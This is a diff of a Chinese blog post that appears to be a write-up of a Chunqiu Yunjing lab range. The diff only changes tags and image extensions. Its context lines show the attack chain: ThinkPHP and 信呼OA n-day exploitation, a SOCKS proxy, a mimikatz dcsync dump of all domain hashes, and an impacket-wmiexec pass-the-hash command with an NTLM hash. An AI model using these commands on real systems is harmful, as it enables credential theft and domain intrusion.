@@ -6,8 +6,8 @@ date: "2025-08-09T21:49:36"
 lastmod: "2025-08-09T21:49:36"
 image: ""
 license: ""
-categories: ["春秋云镜"]
-tags: ["Pentest"]
+categories: ["offensive-security"]
+tags: ["春秋云镜"]
 ---
 接下来的日子，博客会多一些春秋云镜的靶场wp，我会尽可能的写清楚，而不是写详细，我看过很多网上的WriteUp，他们大部分只说了步骤，但是从未提及为何
 
@@ -15,7 +15,7 @@ tags: ["Pentest"]
 
 看到网站logo为thinkphp的logo，
 
-![image](./assets/001.webp)
+![image](./assets/001.png)
 
 NDAY，发现可以直接RCE，运行`curl ip.sb`发现出网，可以弹shell，也可以写马，这里选择写马
 
@@ -149,7 +149,7 @@ socks 5555
 
 现在我们就搭建好了socks5的代理了，使用`proxifier`弄一个全局代理
 
-![image](./assets/002.webp)
+![image](./assets/002.png)
 
 信呼OA这个系统刚好版本也是可以用NDAY打的
 
@@ -228,7 +228,7 @@ net user /domain
 
 本来想的是直接新建用户上去的，但是发现一个问题，就是链接之后直接蓝屏了（忘记了）
 
-![image](./assets/003.webp)
+![image](./assets/003.png)
 
 确认是域用户
 
@@ -312,7 +312,7 @@ kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 exit
 ```
 
-![image](./assets/007.webp)
+![image](./assets/007.png)
 
 再直接横向即可
 
@@ -320,4 +320,3 @@ exit
 proxychains4 impacket-wmiexec xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8 -codec gbk
 type Users\Administrator\flag\flag03.txt
 ```
-
